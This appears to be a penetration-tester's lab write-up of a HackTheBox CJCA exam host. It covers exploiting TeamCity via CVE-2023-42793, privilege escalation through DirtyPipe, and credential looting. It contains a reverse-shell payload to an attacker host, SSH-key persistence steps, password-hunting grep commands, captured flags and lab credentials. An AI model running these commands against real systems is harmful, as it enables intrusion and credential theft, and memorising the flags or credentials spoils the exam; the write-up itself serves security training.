#Status/Exam-Done #Type/Lab #Context/Redteam #Exam/CJCA

---
## Target Information

>[!INFO]- Target Information:
>```
>IP Address: 10.129.230.230 (also appeared as 10.129.17.27, 10.129.17.45 across resets)
>Hostname:   teamcity.luminex.htb (inferred)
>OS:         Linux (Ubuntu, kernel 5.13.0-051300-generic)
>Platform:   HackTheBox CJCA Exam
>```

---
## Timeline

>[!INFO]- Timeline:
>```
>2026-04-25 10:40 — Started nmap scan on NIX01
>2026-04-25 10:52 — Port 8111 identified; TeamCity 2023.05.3 (build 129390) confirmed
>2026-04-25 ~11:00 — CVE-2023-42793 exploit.py run; rogue admin token obtained
>2026-04-25 ~11:15 — RCE via rce.py; reverse shell as teamcity
>2026-04-25 ~11:20 — Stable SSH access via authorized_keys injection
>2026-04-25 ~11:30 — linpeas run; DirtyPipe (CVE-2022-0847) flagged
>2026-04-25 ~12:00 — DirtyPipe compiled and executed; root shell
>2026-04-25 16:01 — Root flag captured; off target
>```

---
## Enumeration

### Port Scan Results

>[!INFO]- Port Scan Results:
>```
>nmap -oN NIX01-TCP-Ports -sT -p- -Pn <target-ip>
>nmap -sT -p8111 <target-ip>
>
>PORT     STATE SERVICE
>22/tcp   open  ssh    OpenSSH
>8111/tcp open  http   TeamCity CI/CD — version 2023.05.3 (build 129390)
>```

### Service Enumeration

>[!INFO]- Service Enumeration:
>```
># Browse to http://<target-ip>:8111 — version displayed on login page
># TeamCity 2023.05.3 (build 129390) — vulnerable to CVE-2023-42793
>```

---
## Foothold

### Vulnerability Identified

>[!INFO]- Vulnerability Identified:
>```
>CVE-2023-42793 — JetBrains TeamCity Unauthenticated Remote Code Execution
>Affects TeamCity versions prior to 2023.05.4.
>An unauthenticated attacker can create a rogue administrator account via a crafted
>HTTP request to /app/rest/users. The resulting token enables RCE through the build
>agent system.
>```

### Exploitation Steps

>[!INFO]- Exploitation Steps:
>```
># 1. Run exploit to create rogue admin and obtain auth token
>python exploit.py -u http://<target-ip>:8111
># Credentials created: admin.OxWF / Password@123
>
># 2. Use token to execute reverse shell
>python rce.py -u http://<target-ip>:8111 -t <token> -c '"/bin/bash"&params="-c"&params="sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<attacker-ip>%2F4444%200%3E%261"'
># Result: reverse shell as teamcity user
>
># 3. Upgrade to stable SSH via authorized_keys injection
>mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
># Append attacker public key to authorized_keys, then:
>ssh -i ~/.ssh/id_rsa teamcity@<target-ip>
>```

---
## Privilege Escalation

### Vector Identified

>[!INFO]- Vector Identified:
>```
>CVE-2022-0847 — DirtyPipe (Linux kernel 5.8 – 5.16 local privilege escalation)
>Identified by linpeas via kernel version check: 5.13.0-051300-generic (vulnerable range).
>Allows an unprivileged user to overwrite data in read-only files via the pipe subsystem,
>enabling direct escalation to root.
>```

### Steps Taken

>[!INFO]- Steps Taken:
>```
># 1. Upload linpeas and DirtyPipe exploit source to target
>scp -i ~/.ssh/id_rsa linpeas.sh teamcity@<target-ip>:/home/teamcity/
>scp -i ~/.ssh/id_rsa compile.sh exploit-1.c exploit-2.c teamcity@<target-ip>:/home/teamcity/
>
># 2. Run linpeas to confirm kernel version and privesc vector
>chmod +x linpeas.sh && ./linpeas.sh
>
># 3. Compile and execute DirtyPipe
>chmod +x compile.sh
>./compile.sh
>./exploit-1
># Result: root shell
>```

---
## Flags

>[!INFO]- Flags:
>```
>User (teamcity): f6529ef222c06bc0e12cc7fcf09a7828
>Root:            a7bf0f80ea28de8a8505ab9d39893ce3
>```

---
## Loot

>[!INFO]- Loot:
>```
>MySQL credentials from /root/.docker/Dockerfile:
>  MYSQL_ROOT_PASSWORD = vjb_kbt5ecw6tjh2TQY
>  MYSQL_DATABASE      = luminex
>  MYSQL_USER          = admin
>  MYSQL_PASSWORD      = yne6FZA5mqd5zxe*nfj
>
>User credentials from /root/.docker/init.sql:
>  marc:010203      — valid on NIX02
>  john:1234567890  — valid on WIN01
>
>Cracked /etc/shadow hashes — see CJCA-NIX01-cracked-password-1.png
>```

---
## Rabbit Holes

>[!INFO]- Rabbit Holes:
>```
>- Did not fully enumerate all credential files on NIX01 before pivoting to NIX02.
>  The credentials needed for NIX02 (marc:010203) and WIN01 (john:1234567890) were
>  sitting in /root/.docker/init.sql. Spent a long time stuck on NIX02 because the
>  required password had not been found yet.
>  Lesson: do not leave a rooted host until you have checked /root/, home dirs,
>  Docker files, .bash_history, and any database init scripts.
>```

---
## Lessons Learned

>[!INFO]- Lessons Learned:
>```
>- Before pivoting off a rooted Linux host, always run:
>  find /root /home /opt /etc -name "*.sql" -o -name "Dockerfile" -o -name "*.env" -o -name "init*" 2>/dev/null
>  grep -rn "password\|passwd\|secret" /root/ /home/ 2>/dev/null
>- Read ALL of linpeas output — kernel CVEs are flagged early but easy to miss if you
>  stop reading after the first few sections.
>- Authorized_keys SSH persistence is faster and more stable than managing a reverse
>  shell — set it up on every host as early as possible.
>```

---
## Related Concepts
- [[Linux Fundamentals]]
- [[Linux System Management]]

## Related Techniques
- (CVE-2023-42793 TeamCity RCE — not yet created, see backlog)
- (CVE-2022-0847 DirtyPipe — not yet created, see backlog)

## Related Playbooks
- [[Linux Pentest Playbook]]

## Related Tools
- [[PEASS-ng]]
- [[Nmap]]

---
## References / Images
- [[Assets/Images/CJCA/CJCA-NIX01-teamcity-login-1.png|TeamCity Login Page]]
- [[Assets/Images/CJCA/CJCA-NIX01-teamcity-server-1.png|TeamCity Server Info]]
- [[Assets/Images/CJCA/CJCA-NIX01-teamcity-rce-exploit-1.png|TeamCity CVE-2023-42793 Exploit Output]]
- [[Assets/Images/CJCA/CJCA-NIX01-user-flag-1.png|User Flag]]
- [[Assets/Images/CJCA/CJCA-NIX01-ssh-access-1.png|Stable SSH Access Established]]
- [[Assets/Images/CJCA/CJCA-NIX01-privesc-vectors-1.png|LinPEAS PrivEsc Vectors Output]]
- [[Assets/Images/CJCA/CJCA-NIX01-root-flag-1.png|Root Flag]]
- [[Assets/Images/CJCA/CJCA-NIX01-mysql-creds-1.png|MySQL Credentials from Dockerfile]]
- [[Assets/Images/CJCA/CJCA-NIX01-cracked-password-1.png|Cracked Shadow Passwords]]
- [[Assets/Images/CJCA/CJCA-NIX01-docker-cloudconfig-1.png|Docker Config Loot]]
- [[Assets/Images/CJCA/CJCA-NIX01-loot-passwords-1.png|Loot Passwords File]]
- CVE-2023-42793: https://nvd.nist.gov/vuln/detail/CVE-2023-42793
- CVE-2022-0847: https://nvd.nist.gov/vuln/detail/CVE-2022-0847
